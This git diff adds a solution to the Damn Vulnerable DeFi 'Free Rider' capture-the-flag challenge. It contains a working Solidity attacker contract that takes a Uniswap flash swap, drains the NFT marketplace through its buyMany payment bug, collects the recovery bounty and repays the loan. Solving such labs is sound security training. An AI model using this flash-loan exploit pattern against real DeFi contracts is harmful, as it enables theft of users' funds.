@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: MIT
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
-pragma solidity =0.8.25;
+pragma solidity >=0.8.25 <0.9.0;
 
 import {Test, console} from "forge-std/Test.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
@@ -11,6 +11,96 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+
+contract FreeRiderAttacker {
+    address payable immutable player;
+    FreeRiderNFTMarketplace immutable marketplace;
+    FreeRiderRecoveryManager immutable recoveryManager;
+    DamnValuableNFT immutable nft;
+    IUniswapV2Pair immutable uniswapPair;
+    WETH immutable weth;
+    uint256 immutable nftPrice;
+    uint256 immutable amount;
+
+    constructor(
+        address payable _player,
+        address payable _marketplace,
+        address _recoveryManager,
+        address _nft,
+        address _uniswapPair,
+        address payable _weth,
+        uint256 _nftPrice,
+        uint256 _amount
+    ) {
+        player = _player;
+        marketplace = FreeRiderNFTMarketplace(_marketplace);
+        recoveryManager = FreeRiderRecoveryManager(_recoveryManager);
+        nft = DamnValuableNFT(_nft);
+        uniswapPair = IUniswapV2Pair(_uniswapPair);
+        weth = WETH(_weth);
+        nftPrice = _nftPrice;
+        amount = _amount;
+    }
+
+    function attack() external {
+        // Flash swap from Uniswap: borrow WETH, must be repaid in this tx
+        uniswapPair.swap(
+            nftPrice, // borrow exactly the price of one NFT in WETH
+            0,        // no DVT tokens
+            address(this),
+            abi.encode("flashloan") // arbitrary data to trigger callback
+        );
+
+        // Transfer any remaining ETH to player
+        if (address(this).balance > 0) {
+            player.transfer(address(this).balance);
+        }
+    }
+
+    // uniswapV2Call is the callback from Uniswap flash swap
+    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external {
+        require(msg.sender == address(uniswapPair), "only uniswap");
+
+        // Convert borrowed WETH to ETH
+        weth.withdraw(amount0);
+
+        // Create array of NFT IDs to buy
+        uint256[] memory tokenIds = new uint256[](amount);
+        for (uint256 i = 0; i < amount; i++) {
+            tokenIds[i] = i;
+        }
+
+        // Buy all NFTs in one call, paying only once
+        // Due to the marketplace bug, it will pay us back after transferring the NFT
+        marketplace.buyMany{value: nftPrice}(tokenIds);
+
+        // Now we own all NFTs, transfer them to recovery manager to get the bounty
+        for (uint256 i = 0; i < amount; i++) {
+            nft.safeTransferFrom(
+                address(this),
+                address(recoveryManager),
+                i,
+                abi.encode(player) // passes player address to receive bounty
+            );
+        }
+
+        // Calculate flash swap fee (0.3%)
+        uint256 fee = (amount0 * 3) / 997 + 1;
+        uint256 amountToReturn = amount0 + fee;
+
+        // Convert ETH back to WETH and repay the flash loan
+        weth.deposit{value: amountToReturn}();
+        weth.transfer(address(uniswapPair), amountToReturn);
+    }
+
+    // Required to receive ETH
+    receive() external payable {}
+
+    // Required to receive NFTs
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+}
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +213,20 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
+        // Deploy attacker contract
+        FreeRiderAttacker attacker = new FreeRiderAttacker(
+            payable(player),
+            payable(address(marketplace)),
+            address(recoveryManager),
+            address(nft),
+            address(uniswapPair),
+            payable(address(weth)),
+            NFT_PRICE,
+            AMOUNT_OF_NFTS
+        );
         
+        // Execute attack
+        attacker.attack();
     }
 
     /**
